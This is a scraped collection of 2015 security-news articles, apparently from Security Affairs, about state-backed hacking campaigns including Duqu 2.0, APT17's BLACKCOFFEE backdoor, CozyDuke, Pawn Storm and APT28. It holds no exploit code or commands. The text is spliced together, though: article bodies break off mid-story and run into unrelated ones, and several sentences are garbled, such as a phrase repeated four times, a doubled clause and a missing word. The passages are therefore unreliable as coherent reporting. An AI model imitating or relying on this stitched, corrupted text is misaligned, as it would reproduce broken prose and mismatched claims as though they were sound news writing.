revealing possible avenues for blackmailing or recruiting people who have security clearances.\n\nWhen cyber security experts reference Chinese APT, in the majority of cases they consider these groups linked to the Government of Beijing.\n\n\n\nContacted for a comment, United Airlines didn\u2019t immediately respond.\n\nThe situation is very concerning, according to a report submitted as testimony by Greg Wilshusen, director of information security issues at GAO, in a recent congressional hearing cybersecurity incidents that involved federal government have increased more than 1,000 percent since 2006.\n\nThe document reports that in the fiscal year 2014, federal agencies suffered 67,168 cyber security incidents that exposed personally identifiable information (PII), meanwhile the number of incidents in 2006 was just 5,503 (+ 1,121%).\n\n\n\nThe number of cyber attacks increased as never before as their level of sophistication, it is essential that private firms and Government agencies will increase resilience of their systems against cyber attacks.\n\nAt the time I was writing another worrying news is circulating on the web, part of a Pentagon email network taken down over suspicious activity, the US authorities are investigating on the alleged intrusion.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  Pentagon, United Airlines)\n\n", "topics": ""}, {"news_name": "Russian APT launched a new phishing campaign on the Pentagon", "news_link": "https://securityaffairs.co/wordpress/38683/cyber-crime/russian-apt-on-pentagon.html", "title": "Russian APT launched a new phishing campaign on the Pentagon\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 19, 2015", "body": "\u201cThe sophistication of this attack far surpasses anything we have seen to date from any state actors,\u201d said Michael Adams, a computer security expert who served more than two decades in the U.S. Special Operations Command. \n\n\u201cTo use a military analogy, the level of sophistication of this attack is like comparing a World War I propeller-driven fighter plane to a stealth bomber coming in under the radar, completely destroying its target, and leaving before the enemy even realizes they have been attacked,\u201d Adams said.\n\nThe disconcerting aspect of the story is that hacker are still targeting US government agencies, a new sophisticated campaign was detected on July 8.

LTD (aka Foxconn Technology Group) to digitally sign the malicious code.\n\nAccording to the malware researchers at Kaspersky, the digital certificate was issued by VeriSign and used the authors of Duqu 2.0 to digitally sign the source code of a driver designed to mask command-and-control traffic.\n\nFoxconn provides electronic components for a wide number of companies, including Apple and BlackBerry.\n\nThe majority of Duqu 2.0 infections was observed between 2014 and 2015 concurrently to the negotiations on the Iranian nuclear program engaged by the P5+1 (the United States, United Kingdom, Germany, France, Russia, and China, facilitated by the European Union) with Iran.\n\n\u201cThe attackers created an unusual persistence module which they deploy on compromised networks. It serves a double function \u2013 it also supports a hidden C&C communication scheme. This organization-level persistence is achieved by a driver that is installed as a normal system service. On 64-bit systems, this implies a strict requirement for an Authenticode digital signature. We have seen two such persistence drivers deployed in the course of attacks.\u201d states a blog post published by the Kaspersky Lab\u2019s Global Research & Analysis Team (GReAT).\n\nThe researchers discovered that the threat actors installed malicious digitally signed drivers for network devices to interfere with traffic routing.\n\n \n\n\n\n\u201cDuring their operations the Duqu threat actors install these malicious drivers on firewalls, gateways or any other servers that have direct Internet access on one side and corporate network access on the other side. By using them, they can achieve several goals at a time: access internal infrastructure from the Internet, avoid log records in corporate proxy servers and maintain a form of persistence after all.\u201d continues the post.\n\n\u201cIn essence, the drivers are redirecting network streams to and from the gateway machine that runs it,\u201d the researchers explained. \u201cTo forward connections, the attacker first has to pass a network-based \u201cknocking\u201d mechanism by using a secret keyword. We have seen two different secret keywords in the samples we collected so far: \u201cromanian.antihacker\u201d and \u201cugly.gorilla\u201d.\u201d\n\nThe used of digitally signed code seeming to be a prerogative of threat actor behind Duqu, the attackers haven\u2019t used the same digital signature more than once.\n\n\u201cAnother interesting observation is that besides these Duqu drivers we haven\u2019t uncovered any other malware signed with the same certificates,\u201d the researchers continued. \u201cThat rules out the possibility that the certificates have been leaked and are being used by multiple groups. It also seems to indicate the Duqu attackers are the only ones who have access to these certificates, which strengthens the theory they hacked the hardware manufacturers in order to get these certificates.\u201d\n\nStay tuned!\n\nPierluigi Paganini\n\n(Security Affairs \u2013 Duqu 2.0,  malware)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt", "topic_name": "APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/digital-certificate", "topic_name": "Digital Certificate"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/duqu-2-0", "topic_name": "Duqu 2.0"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackign", "topic_name": "hackign"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}]}, {"news_name": "OPM data offered for sale on the Dark Web", "news_link": "https://securityaffairs.co/wordpress/37803/cyber-crime/opm-data-dark-web.html", "title": "OPM data offered for sale on the Dark Web\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 15, 2015", "body": "While security experts speculate on the possible responsible for the recent data breach at US the Office of Personnel Management (OPM) the alleged data appeared in the dark web.

Duqu 2.0 is a very sophisticated agent that exploited a number of zero-days vulnerabilities and malware researchers noticed that among its targets there were entities linked to the negotiations about Iran\u2019s nuclear deal and IT security firms. Duqu 2.0 also targeted other entities in Western countries, in Asia and in the Middle East. Experts at Symantec also detected the new strain of malware and observed infection almost in every continent.\n\nResearchers at Kaspersky Lab speculate that Duqu 2.0 may have leveraged the following zero-days:\n\n\u201cMost notably, some of the new 2014-2015 infections are linked to the P5+1 events and venues related to the negotiations with Iran about a nuclear deal. The threat actor behind Duqu appears to have launched attacks at the venues for some of these high level talks. In addition to the P5+1 events, the Duqu 2.0 group has launched a similar attack in relation to the 3 70th anniversary event of the liberation of Auschwitz-Birkenau.\u201d states a report published by Kaspersky Lab.\n\nThe experts at Kaspersky Lab confirmed that threat actors behind Duqu 2.0 was detected in an attempt of intrusion against its internal network. The discovery of the intrusion was casual, Kaspersky discovered Duqu 2.0 while testing a new technology designed to detect advanced persistent threats.\n\nThe attack against Kaspersky likely began with a spear phishing attack against an employee in a smaller offices in the Asia-Pacific region.\n\n\u201cIn the case of Kaspersky Lab, the attack took advantage of a zero-day (CVE-2015-2360) in the WindowsKernel, patched by Microsoft on June 9 2015 and possibly up to two other, currently patched vulnerabilities, which were zero-day at that time\u201d states Kaspersky confirming the intrusion.\n\nOnce detected the intrusion the researchers started an internal audit that is still ongoing, anyway the company confirmed the high level of sophistication of the malware which is the most advanced ever seen. The experts confirmed that the sophistication of the attack is greater than the one observed for the Equation Group.\n\nDuqu 2.0 resides in memory making hard its detection and use a complex system to communicate with the control infrastructure.\n\n\u201cIt also doesn\u2019t directly connect to a command-and-control server to receive instructions,\u201d explained Kurt Baumgartner, principal security researcher at Kaspersky Lab. \u201cInstead, the attackers infect network gateways and firewalls by installing malicious drivers that proxy all traffic from internal network to the attackers\u2019 [command and control servers]. Combined, this made discovery very difficult.\u201d\n\nThe new strain of Duqu has many similarities with the original variant spotted in 2011, bad actors behind Duqu 2.0  didn\u2019t appear to work at all on Saturdays and compilation timestamps provided useful information to profile the attackers.\n\n\n\n\u201cDuring our analysis in 2011, we noticed that the logs collected from some of the proxies indicated the attackers appear to work less on Fridays and didn\u2019t appear to work at all on Saturdays, with their regular work week starting on Sunday,\u201d explained Baumgartner. \u201cThey also compiled binaries on January 1st, indicating it was probably a normal workday for them. The compilation timestamps in the binaries seemed to suggest a time zone of GMT+2 or GMT+3. Finally, their attacks would normally occur on Wednesdays, which was the reason we originally referred to them as the \u201cWednesday Gang\u201d.\u201d\n\nEugene Kaspersky, CEO of Kaspersky Lab is worried by the boldness of the authors of Duqu 2.0\n\n\u201cSpying on cybersecurity companies is a very dangerous tendency,\u201d said Kaspersky. \u201cSecurity software is the last frontier of protection for businesses and customers in the modern world\u201d\n\nWhy attack the Kaspersky firm?\n\nThere are a number of good reasons to hit the popular company, first of all, to steal the secrets about its technologies, information that could be used to arrange new cyber espionage campaigns avoiding detection.

At this time, the diagnostic of the EINSTEIN system is critical, considering the limitations to detect or protect against new threats. This particular problem is related to scalability and maintainability of legacy systems to the defense industry.\n\n\n\nEINSTEIN system is characterized for many versions, starting with Einstein 2 \u2013E2 and today, Einstein 3 \u2013E3 is the most updated version of US defense system. EINSTEIN 3 (E3) is recognized as a system that manages highly classified data. Nonetheless, today the Office of Personnel Management (OPM) is requiring a prompt installation of Einstein 3 in civilian agencies for the period 2016 \u2013 2018. US-CERT has deployed the capabilities of E3 since the beginning of 2015, in order to detect potential intrusions which occurred in April 2015, and officially had been compromised to OPM data in May 2015.\n\nAnalyzing the limitations of EINSTEIN 3, there is a problem of systems integration between DHS and US-CERT, governmental agencies, interagency partners and the private sector. Therefore, E3 must include in the current version, new updates, such as a sandboxing to prevent cyber-attacks using unknown malware.\n\nMichael Brown, who contributed to the implementation of the Einstein technology in 2012 at the Department of Homeland Security, considered important to enhance visibility inside of networks and capabilities of different defense systems and programs, including E3.\n\n\u201cA recent Search-Security survey found that only 52% of respondents believed that signature-based defenses were \u201ceffective against the majority of today\u2019s malware.\u201d Reported by TechTarget\n\nThe continuous cyber-attacks and exponential cyber-intrusions to the infrastructures of government and important targets in the industry; represents an opportunity for different actors and atmospheres to react with possible development and implementation of cyber-weapons.\n\nThere is a new challenge for Einstein 3 with the five major Internet service providers in US \u2013CenturyLink Inc., Level 3 Communications Inc., Sprint Corp, AT&T Inc. and Verizon Communications. Thus, E3 must guarantee visibility to detect cyber risks inside ISP\u2019s networks.\n\nIn fact, the US Defense sector urges to get new alliances with Internet Companies towards to perform the best strategies to harmonize cyber threats and materialization of cyber-attacks.\n\n\u201cBanks and technology companies will need to buy cutting-edge technologies that can detect intruders inside networks and eject them quickly, before the data is gone.\u201d Reported by Conservative Read\n\nAbout the Author Francisco Javier Delgado Villarreal\n\nFrancisco Javier Delgado Villarreal is a Junior Business Continuity, Cybersecurity and Internet Governance Consultant.

The US hackers tried to compromise the systems by using a variant of the Stuxnet virus, this variant was designed specifically to infect systems at Korean nuclear plants.\n\nThe Reuters revealed that the NSA failed to spread Stuxnet into North Korea\u2019s nuclear plants because they were totally isolated from the rest of the world.\n\n\u201cThe United States tried to deploy a version of the Stuxnet computer virus to attack North Korea\u2019s nuclear weapons program five years ago but ultimately failed, according to people familiar with the covert campaign. The operation began in tandem with the now-famous Stuxnet attack that sabotaged Iran\u2019s nuclear program in 2009 and 2010 by destroying a thousand or more centrifuges that were enriching uranium. Reuters and others have reported that the Iran attack was a joint effort by U.S. and Israeli forces.\u201d states the Reuters.\n\nThe Reuters cites an unnamed US official as confirming that the same team that designed Stuxnet also developed similar malware that was able to activate itself only when it encountered Korean computers.\n\nThe US intelligence was aware that North Korea used centrifuges obtained from the Pakistani scientist, A.Q. Khan, the same centrifuges that were used by Iranian scientists at the nuclear plant if Natanz. It is likely that both Korea and Iran were using the same SCADA systems produced by Siemens controlled by applications running on Windows OS.\n\nIf these reports are confirmed, they would be enough to make small changes to Stuxnet effective against systems of North Korea.\n\nThe principal reason for the failure of the US cyber attack resides in the difficulty to reach the Korean networks.\n\n\u201cThe official said the National Security Agency-led campaign was stymied by North Korea\u2019s utter secrecy, as well as the extreme isolation of its communications systems. A third source, also previously with U.S. intelligence, said he had heard about the failed cyber attack but did not know details.\n\nNorth Korea has some of the most isolated communications networks in the world. Just owning a computer requires police permission, and the open Internet is unknown except to a tiny elite.

The experts found interesting the C&C obfuscation techniques adopted by the threat actors.\n\nHackers belonging to the APT17 are using the legitimate Microsoft\u2019s TechNet web portal to host IP addresses for command and control (C&C) servers. The IP addresses for C&C servers are encoded by attackers, the encoded string is found in profiles and posts limited with the \u201c@MICROSOFT\u201d and \u201cCORPORATION\u201d tags.\n\nThe Chinese APT17 has been targeting United States government organizations, the military, NGOs, defense contractors, law firms, IT firms, and mining companies. One of the tools leveraged by the group is BLACKCOFFEE, a backdoor that can be used to upload and download files, create a reverse shell on the infected system, enumerate files and processes, manipulate files, and terminate processes.\n\nThe technique implemented by the attackers allows them to delay detection of malicious activities and the discovery of the C&C server\u2019s IP address.\n\n\u201cAfter discovering the BLACKCOFFEE activity, the FireEye-Microsoft team encoded a sinkhole IP address into the profile pages and forum threads and locked the accounts to prevent the threat actors from making any changes,\u201d states the report. \n\nThe researchers involved in the investigation who analyzed the hacking tools used by the threat actors noticed the use of the BLACKCOFFEE backdoor, which could be used by attackers to perform several operations on the victim\u2019s machine such as upload/download files, create a reverse shell, manipulate files, and kill processes.\n\nThe malware has been used since 2013 by the APT17 and researchers noticed that the C&C servers corresponding to the IP addresses on the Microsoft\u2019s TechNet web portal are now controlling the malicious code.\n\n\n\nThe strain of BLACKCOFFEE backdoor detected by FireEye contains URLs that point to TechNet forum threads or biography sections in profiles created by the threat actors.\n\nOnce the malicious agent obtains the IP address of the C&C is obtained, the malware starts communicating with the server to receive commands and send back the exfiltrated data. The technique allows APT17 operators to improve resilience of the botnet to attacks of law enforcement, even if the C&C changes it is sufficient that malware load the new C&C list hosted on the Microsoft portal.\n\n\u201cIf the C2 server is discovered or shut down, the threat actors can update the encoded IP address on TechNet to maintain control of the victims\u2019 machines,\u201d the companies explained in the report.\n\nFireEye has published the Indicators of compromise on Github.\n\nPierluigi Paganini\n\n(Security Affairs \u2013 APT17, cyber espionage)\n\n", "topics": ""}, {"news_name": "Cyber threats scare a society increasingly dependent on technology", "news_link": "https://securityaffairs.co/wordpress/36778/cyber-crime/cyber-threats-increase.html", "title": "Cyber threats scare a society increasingly dependent on technology\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 13, 2015", "body": "Until the end of 2020, experts estimated that between 25 to 50 billion devices on the planet will be connected to the internet, and counting that the Internet of Thing will keep growing it also means that for the hackers the opportunities to exploit devices are growing too.\n\nAs you may realize hacking campaigns nowadays are more sophisticated that even before and take are taking advantage of people\u2019s mistakes to get some gains. Besides these facts, there is also the action of state-sponsored hackers involved in information warfare operations, hacktivists and malicious people, all these actors concur to make the cyberspace unstable.\n\nRay Boisvert, former Director General of the Counterterrorism program for the Canadian Security Intelligence Service (CSIS) talked in April at a conference, \u201cWhat is a great cyber intelligence tool today is tomorrow\u2019s exploit,\u201d\n\nBoisvert emphasized that \u201cStuxnet\u201d (a NSA creation) gave a huge knowledge to many parties of the cyberwar game, because after being reverse-engineered it was used to develop by malware authors as base for new malware.\n\nBut the question remains, which are the four cyber threats that are emerging?\n\nEach country has their own cyber program, making an asymmetrical warfare\n\n\u201cCyber warfare doesn\u2019t require a significant number of troops or a superior set of bombs,\u201d said the cyber security expert David Kennedy, and he is right, a small group of knowledgeable people can do a lot of damage, and Iran was one of the first to realize that and develop their or cyber program.\n\nThe Iranian cyber program has grown beyond expected and the attacks run by Iranian hackers include private firms, government and military entities, Oil and Gas companies, energy, transportations, airlines, airports, hospitals, aerospace industries, you name it, they have done all.\n\nBut lately a hot case has been the attack to Sony Pictures on December 2014, performed by North Korea hackers dubbed GoP, where 11 terabytes of confidential data were stolen.\n\n\n\nWhat to expect in the next months?\n\nCyber Warfare is already a part of the military doctrine\n\nUsing again Iran as an example, its predicted that its predicted that its predicted that its predicted that \u201cIn 10 years\u2019 time, Iran\u2019s cyber capabilities will be more troubling than its nuclear program,\u201d observed geopolitical expert Ian Bremmer.\n\nIran increased the budget for the cyber security department, spending nowadays around $19.8 million per year, but of course Iran it isn\u2019t alone in the race, so almost every country is doing the same. Another example to prove the point, Chine increased their budget for cyber security in 20-30%,\n\n\u201cThey [the Chinese] have previously devoted substantial resources to cyber espionage and theft,\u201d, \u201cChina\u2019s vision of combined operations, with cyber as a strong component of its capability, will significantly challenge American freedom of action in the Pacific.\u201d  said Paul Rosenzweig, a cyber-security expert.\n\nAnd we can\u2019t forget about Russia, they \u201cwill be responsible for conduction offensive cyber activities, including propaganda operations and inserting malware into enemy command and control systems,\u201d said James Clapper, a US director of national intelligence.\n\nIn 2011, Russian hackers were responsible for exploiting a breach in the stock exchange market, \u201cinserting a digital bomb.\u201d\n\nIdentify theft is increasing and spreading fast\n\nAbout identity theft, it\u2019s largely used to exploit the weakest link in the security chain, the humans. When someone is trying to hack a huge corporation, one of the first things that he does is trying to identify the internal staff of the organization, then he tries to target it with surgical attacks, for example a spear \u201cphishing attack\u201d\n\nSCADA systems are a target for hackers\n\nSCADA systems, responsible for controlling many industrial processes like power grid and oil and gas pipelines are a privileged target for hackers. Targeting a SCADA system used in a critical infrastructure it is possible to cause serious damage to a Government. Recently the expert discovered the present of the dreaded \u201cBlackEnergy malware\u201d in US infrastructures that were targeted by Russian hackers.\n\nAs confirmed by the last report issued by the US-CERT, the number of attacks against SCADA systems is increasing and in the majority of cases it conducted by sophisticated APT groups.\n\nIt is easy to predict a rapid increase of successful attacks because we are depending even more in the technology, it is important that citizens, private companies and Governments will increase their efforts to assume a proper security posture.\n\nAbout the Author Elsio Pinto\n\nEdited by Pierluigi Paganini\n\n(Security Affairs \u2013  cyber threats, hacking)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/information-warfare", "topic_name": "Information Warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/internet-of-things", "topic_name": "Internet of Things"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iot", "topic_name": "IoT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/north-korea", "topic_name": "North Korea"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-hackers", "topic_name": "state sponsored hackers"}]}, {"news_name": "Iran accused of the blackout  that paralyzed the Turkey", "news_link": "https://securityaffairs.co/wordpress/36536/cyber-warfare-2/iran-accused-blackout-turkey.html", "title": "Iran accused of the blackout  that paralyzed the Turkey\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "May 4, 2015", "body": "On March 31 2015, a major power failure interested the Turkey, a blackout paralyzed the principal cities across the country, more than 40 million people were plunged into darkness.

It could also be related to Turkey\u2019s recent moves to topple Syrian dictator Bashar Assad, who is also a strong Iranian ally.\n\nAnother wing of the international community of the intelligence elaborated a different hypothesis, due to the alliance between the Syria and the Iran, Iranian state-sponsored hackers  hit the Turkey due to its moves to topple the Syrian regime led by President Bashar Assad.\n\nRecently The British Business Insider published an interesting post on the Iranian cyber capabilities, according the experts the Government of Teheran is improving expertise in the cyber domain faster than experts \u2018would have ever imagined\u2019.\n\nIran is secretly working on a new generation of  that could cause serious damages to the critical infrastructure of foreign governments and that could be used to penetrate their networks.\n\nAccording to the research firm Small Media, Iran increased cyber-security spending 12-fold since President Hassan Rouhani gained power in 2013.

About 30 percent of the incidents hit infrastructures in the energy sector, meanwhile Critical Manufacturing (i.e. manufacturing of vehicles and aviation and aerospace components) accounted for 27 percent.\n\nThe most disconcerting aspect is that more than half of the incidents reported by asset owners and industry partners involved sophisticated APT, this means that as explained by the General Keith Alexander the U.S. and its allies are at an ever growing risk of a systemic cyber-assault.\n\nICS/SCADA system were targeted by several categories of bad actors, including cyber criminals, insider threats and hacktivists.\n\nThe modern economy depends on numerous factors, a major cyber attack against any entities in the energy sector (i.e. oil refinery, energy grid) could have a dramatic impact in a global scale.\n\n\u201cWe need something like an integrated air-defence system for the whole energy sector,\u201d added Gen.

Hackers erased most of the company\u2019s emails and documents, leaving an image of a burning American flag on the computer system as their calling card. There was a similar attack on Qatar\u2019s state-energy group RasGas. The action was a form or retaliation for economic sanctions against Iran, but also a warning shot to Riyadh in an escalating battle for Mid-East dominance by the two regional superpowers. It is highly pertinent today given comments by leading figures in Tehran that the Saudis will be \u201cpunished\u201d for their decision to drive down the price of oil.\u201d reported The Telegraph\n\nSpeaking of cyber threats we cannot ignore the menace represented by terrorist organizations, including the ISIS, regarding the dreaded group Gen.

Kaspersky experts have published an interesting blog post that includes numerous technical details on the espionage campaign run by the CozyDuke APT group.\n\nThe most interesting part of the investigation are the similarities between the are the similarities between the CozyDuke and other APT groups such as CosmicDuke, MiniDuke, and OnionDuke.\n\nThe hackers belonging the CozyDuke APTs used spear phishing emails as an attack vector, sometimes the message includes links to malicious websites controlled by attackers and used to serve exploit kits, in other case the email included malicious Flash video attachments.\n\n\u201cThe actor often spearphishes targets with e-mails containing a link to a hacked website.\u201c Kaspersky researchers explained in the report. \u201cIn other highly successful runs, this actor sends out phony flash videos directly as email attachments. A clever example is \u201cOffice Monkeys LOL Video.zip\u201d. The executable within not only plays a flash video, but drops and runs another CozyDuke executable. \u201c\n\n\n\nOnce compromised the targeted system, the malware checks for the presence of defense solutions from principal security vendors, including Kaspersky, Avira, Comodo, Crystal Security, Dr. Web and Sophos.\n\nIn order to elude defense solutions, the components of the CozyDuke executable are signed with fake Intel and AMD digital certificates.\n\nThe experts at Kaspersky discovered that one of the second stage modules of CozyDuke appears to have been developed on the same platform as OnionDuke.\n\n\u201cOne of the second stage modules of CozyDuke/Cozy Bear, Show.dll, is particularly interesting because it appears to have been built onto the same platform as OnionDuke\u201d continues the report.\n\nThis means that malicious codes used by CozyDuke and OnionDuke APTs were written by the same developers or the two development teams work together.\n\n\n\nThe experts also noted that communications between the malicious code and their C&C servers are managed in the same way.\n\nThe experts explained that MiniDuke, OnionDuke, along with CosmicDuke are managed by Russian-speaking authors and some origin appear to have also CozyDuke.\n\n\u201cCozyDuke is definitely connected to these two campaigns, as well as to the OnionDuke cyberespionage operation,\u201d explained Baumgartner, Principal Researcher at Kaspersky Lab\u2019s Global Research and Analysis Team \u201cEvery one of these threat actors continues to track their targets, and we believe their espionage tools are all created and managed by Russian-speakers.\u201d\n\nThe coreshell and chopstick components for the CozyDuke backdoor remind experts of other advanced persistent threat actor, the APT28 group, which is considered a state-sponsored hacking collective.\n\n\u201c[CozyDuke\u2019s] custom backdoor components appear to slightly evolve over time, with modifications to anti-detection, cryptography, and trojan functionality changing per operation. This rapid development and deployment reminds us of the APT28/Sofacy toolset, especially the coreshell and chopstick components,\u201d Kaspersky researchers noted.\n\nThe experts at Kaspersky haven\u2019t linked the CozyDuke to the Russian Government, but media agencies and many experts believe that the State Department and White House attacks were carried out by Russian hackers working for the Kremlin, which could be also the government behind these APTs.\n\nThe experts speculated that CosmicDuke, MiniDuke and OnionDuke are the products of Russian state-sponsored hackers because the campaigns targeted governments with an interest in Russian affairs. The fact that CosmicDuke operations targeted users of illegal substances may also indicate the involvement of law enforcement agencies of the Russian Government.\n\nExperts have no doubts, the hackers behind CozyDuke campaign will continue their activities in the near future.\n\nPierluigi Paganini\n\n(Security Affairs \u2013  CozyDuke APT, Russia)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/cosmicduke", "topic_name": "CosmicDuke"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cozyduke-apt", "topic_name": "CozyDuke APT"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/digital-certificates", "topic_name": "digital certificates"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/kaspersky", "topic_name": "Kaspersky"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/miniduke", "topic_name": "MiniDuke"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/onionduke", "topic_name": "OnionDuke"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pierluigi-paganini", "topic_name": "Pierluigi Paganini"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-affairs", "topic_name": "Security Affairs"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/spear-phishing", "topic_name": "spear phishing"}]}, {"news_name": "Operation Pawn Storm on Continued Marathon, Attacking Targets Now with Advance Infrastructure", "news_link": "https://securityaffairs.co/wordpress/36139/cyber-crime/op-pawn-storm-continues.html", "title": "Operation Pawn Storm on Continued Marathon, Attacking Targets Now with Advance Infrastructure\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "April 20, 2015", "body": "Operation Pawn Storm allegedly run by hackers backed by the Russian Government still advancing their infrastructure a great deal, the group is believed to using advanced tactics to hit the targets.\n\nTrend Micro revealed that the group have introduced all new infrastructure and is \u201cZeroing in\u201d onto the targets that include NATO (North Atlantic Treaty Organization) members. The group behind Operation Pawn is allegedly linked to government of Russia, and has been operating since 2007. The main targets of this hacking group include defence industry, military, government organizations and the media firms.\n\nFeike Hacquebord, Trend Micro\u2019s senior threat researcher blogged, \u201cThe first quarter of 2015 has seen a great deal of activity from the group\u201d. He further added, \u201cMost notably this involved setting up dozens of exploit URLs and a dozen new command-and-control (C&C) servers targeting NATO members and governments in Europe, Asia and the Middle East.\u201d\n\nThe group makes use of three different types of strategies to launch the attack on targets. One among those three is, spear-phishing where emails having malicious MS office docs laced alongside the Sofacy/SEDNIT malware\n\nare sent to the target. Another strategy being used works as sending phishing emails out that redirects users to the fake OWA (Microsoft Outlook Web Access) login pages. Third way with which they attack on target is, infecting Polish government legitimate sites which then leads victims to aforementioned malware.\n\nFeike Hacquebord stated in his blog post that, \u201cIn a slightly different modus operandi from the usual, we observed Pawn Storm attackers sending out specially-crafted emails designed to trick users into clicking on a malicious link,\u201d.  Adding things further to it, a paragraph from him blog post reads as,\n\n\u201cIn one case, the subject of the spam e-mail is the Southern Gas Corridor that the European Union initiated to become less dependent on Russian Gas. Other e-mails have similar geopolitical subjects, for example the Russian-Ukrainian conflict and the Open Skies Consultative Commission of the OSCE.\u201d\n\n\u201cWhen certain criteria are met the fake news site may respond with a message that an HTML5 plugin has to be installed to view the contents of the site,\u201d he wrote. \u201cThe add-on in question turns out to be a version of X-Agent or Fysbis spyware if you\u2019re a Linux user, and Sednit if you\u2019re running Windows.\u201d\n\n\n\nSome reports even state that, White House is one of the organizations that got attacked by the group. On Jan 26, attackers also targeted three very popular Youtube Bloggers making use of phishing attacks on Gmail \u2013 states the report being issued by Trend Micro.\n\nFeike Hacquebord also blogged, \u201cThis is a classic island hopping technique, in which attackers focus their efforts not on the actual target but on companies or people that might interact with that target, but which may have weaker security in place\u201d.  The Trend Micro researcher added further, \u201cIn a similar way, a well-known military correspondent for a large US newspaper was hit via his personal email address in December 2014, probably leaking his credentials. Later that month Operation Pawn Storm attacked around 55 employees of the same newspaper on their corporate accounts.\u201d\n\nThe group also targeted iOS based devices to infect users with their malware, just recently!\n\nFeike Hacquebord added, \u201cOrganizations must remain on high alert for these kinds of attack, as Operation Pawn Storm hackers go to great lengths to make their emails appear legitimate,\u201d\n\nWhat Trend Micro suggested in their blog post is worth taking into serious consideration. It reads as,  \u201cMilitary and government bodies in the US, Europe and Asia especially must invest in the right advanced cyber security tools to block phishing and malware downloads, and improve user training and education to mitigate the risk of attack.\u201d\n\nWritten by: Ali Qamar, Founder/Chief Editor at SecurityGladiators.com\n\nAuthor Bio:\nAli Qamar is an Internet security research enthusiast who enjoys \u201cdeep\u201d research to dig out modern discoveries in the security industry.

This time the hackers run highly targeted attack by exploiting two zero-day vulnerabilities to target an \u201cinternational government entity\u201d.\n\nIn October 2014, the experts at FireEye published a report on the activity of a group of Russian hackers, dubbed APT28, that is behind long-running cyber espionage campaigns that targeted US defense contractors, European security organizations and Eastern European government entities.\n\nThe hackers also targeted attendees of European defense exhibitions, including the EuroNaval 2014, EUROSATORY 2014, and the Counter Terror Expo and the Farnborough Airshow 2014.\n\nThe APT28 took advantage of vulnerabilities in Adobe Flash software (CVE-2015-3043) and Windows operating system (CVE-2015-1701).\n\n\u201cFireEye said that Adobe had issued a fix for the security weakness on Tuesday, so that users with the most current versions should be protected. The Microsoft problem by itself is less dangerous, since it involves enhanced powers on a computer from those of an ordinary user.\u201d reported the Reuters Agency.\n\n\u201cWhile there is not yet a patch available for the Windows vulnerability, updating Adobe Flash to the latest version will render this in-the-wild exploit innocuous,\u201d states the report published by FireEye. \u201cWe have only seen CVE-2015-1701 in use in conjunction with the Adobe Flash exploit for CVE-2015-3043. We are working with the Microsoft Security Team on CVE-2015-1701.\u201d\n\n\u201cBecause CVE-2015-3043 is already patched, this remote exploit will not succeed on a fully patched system,\u201d FireEye said. \u201cIf an attacker wanted to exploit CVE-2015-1701, they would first have to be executing code on the victim\u2019s machine. Baring authorized access to the victim\u2019s machine, the attacker would have to find some other means, such as crafting a new Flash exploit, to deliver a CVE-2015-1701 payload.\u201d\n\nThe vulnerability affecting Windows OS is still present, a Microsoft spokesman confirmed it and added that the company was working on a patch.\n\n\n\nInvestigators at several security firms believe that APT28 was responsible for a serious breach at U.S. State Department computers in November 2014, and the experts speculate that the team also compromised an unclassified network at the White House accessing sensitive information, including the President Obama agenda.\n\nFireEye doesn\u2019t confirm that APT28 is behind the two incidents.\n\nFireEye researchers collected evidences that the APT28 group is linked to the Russian Government, the team of hackers \u201cdoes not appear to conduct widespread intellectual property theft for economic gain, but instead is focused on collecting intelligence that would be most useful to a government.\u201d\n\n\u201cAPT28 appeared to target individuals affiliated with European security organizations and global multilateral institutions. The Russian government has long cited European security organizations like NATO and the OSCE as existential threats, particularly during periods of increased tension in Europe,\u201d FireEye reported.\u201d\n\nAPT28 is active since 2007 and it has targeted governments, militaries, and security organizations. The group focused its hacking campaign on targets that would be of interest to Russia, such as the Caucasus region with a focus on Georgia.\n\nStay Tuned \u2026\n\nPierluigi Paganini\n\n(Security Affairs \u2013  APT28, Russian hackers)\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/apt28", "topic_name": "APT28"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": 